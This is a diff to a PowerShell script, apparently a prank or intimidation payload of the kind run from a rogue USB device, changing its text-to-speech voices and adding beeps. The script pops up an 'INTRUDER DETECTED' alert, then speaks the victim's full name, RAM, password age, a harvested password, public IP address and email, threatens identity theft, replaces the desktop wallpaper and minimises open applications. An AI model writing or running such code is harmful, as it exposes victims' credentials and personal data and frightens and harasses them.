@@ -292,9 +292,13 @@ function Get-Days_Set {
     return $days
 }
 
-$s = New-Object -ComObject SAPI.SpVoice
+$s1 = New-Object -ComObject SAPI.SpVoice
+# different voices
+$s2 = New-Object -ComObject SAPI.SpVoice
+$s2.Voice = $s2.GetVoices().Item(1)
 
-$s.Rate = -1
+$s1.Rate = -1
+$s2.Rate = -1
 $days = Get-Days_Set
 $full_name = Get-fullName
 $ram = Get-Ram
@@ -347,19 +351,19 @@ $wshell = New-Object -ComObject Wscript.Shell
 $wshell.Popup("INTRUDER DETECTED `nHello $full_name...", 0, "Error", 32 + 4)
 
 
-$s.Speak("Hello $full_name.")
+$s1.Speak("Hello $full_name.")
 
 if ($ram -gt 63) {
-    $s.Speak("You have $ram gigabytes of ram. Really? You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
+    $s1.Speak("You have $ram gigabytes of ram. Really? You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
 }
 elseif ($ram -gt 31) {
-    $s.Speak("You have $ram gigabytes of ram. Decent pc. You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
+    $s1.Speak("You have $ram gigabytes of ram. Decent pc. You dont need that much for watching *THINGS* on the internet $full_name. But a computer this good with no security...")
 }
 elseif ($ram -gt 15) {
-    $s.Speak("You have $ram gigabytes of ram. Nice amout to run. If you just play games, perfect. Good for watching *THINGS* on the internet.. But no security...")
+    $s1.Speak("You have $ram gigabytes of ram. Nice amout to run. If you just play games, perfect. Good for watching *THINGS* on the internet.. But no security...")
 }
 else {
-    $s.Speak("You have $ram gigabytes of ram. Poor you :(. You wont need this pc then.")
+    $s1.Speak("You have $ram gigabytes of ram. Poor you :(. You wont need this pc then.")
 }
 
 
@@ -377,18 +381,21 @@ if ($days -gt 30) {
 else {
     $message = $message + " You have changed your password in $days days. Good job. Guess if you keep this up il have to find a new victim."
 }
+[console]::beep(1000,500), [console]::beep(2000,200)
+$s2.Speak("Nice to see your bwowSer history is somewhat clean")
 
-$s.Speak("Nice to see your bwower history is somewhat clean")
+$s2.Speak($message)
+[console]::beep(1000,500), [console]::beep(2000,200)
 
-$s.Speak($message)
 
-$s.Speak("You think i am just making this info up, well think again... I am sure you thought $pass as a password was sucure...")
-
-$s.Speak("Your public IP address is $ip. I can use it to track your location and find out even more about you.")
-
-$s.Speak("You have a lot of mail in $email. I can use it to steal your identity or scam your friends and family.")
-
-$s.Speak("Want to see something cool?")
+$s1.Speak("You think i am just making this info up, well think again... I am sure you thought $pass as a password was sucure...")
+[console]::beep(1000,500)
+$s2.Speak("Your public IP address is $ip. I can use it to track your location and find out even more about you.")
+[console]::beep(1000,500)
+$s1.Speak("You have a lot of mail in $email. I can use it to steal your identity or scam your friends and family.")
+[console]::beep(1000,500)
+[console]::beep(1000,500), [console]::beep(2000,300), [console]::beep(1000,200)
+$s2.Speak("Want to see something cool?")
 
 
 $Image = Gen-Image -Networks $Networks
@@ -397,7 +404,7 @@ Set-WallPaper -Image $Image -Style "Fit"
 Minimize-Apps
 
 
-$s.Speak("Have a look at your desktop, You will hear from us soon $full_name. Goodluck.")
+$s2.Speak("Have a look at your desktop, You will hear from us soon $full_name. Goodluck.")
 
 # open the terminal and run the commands
 
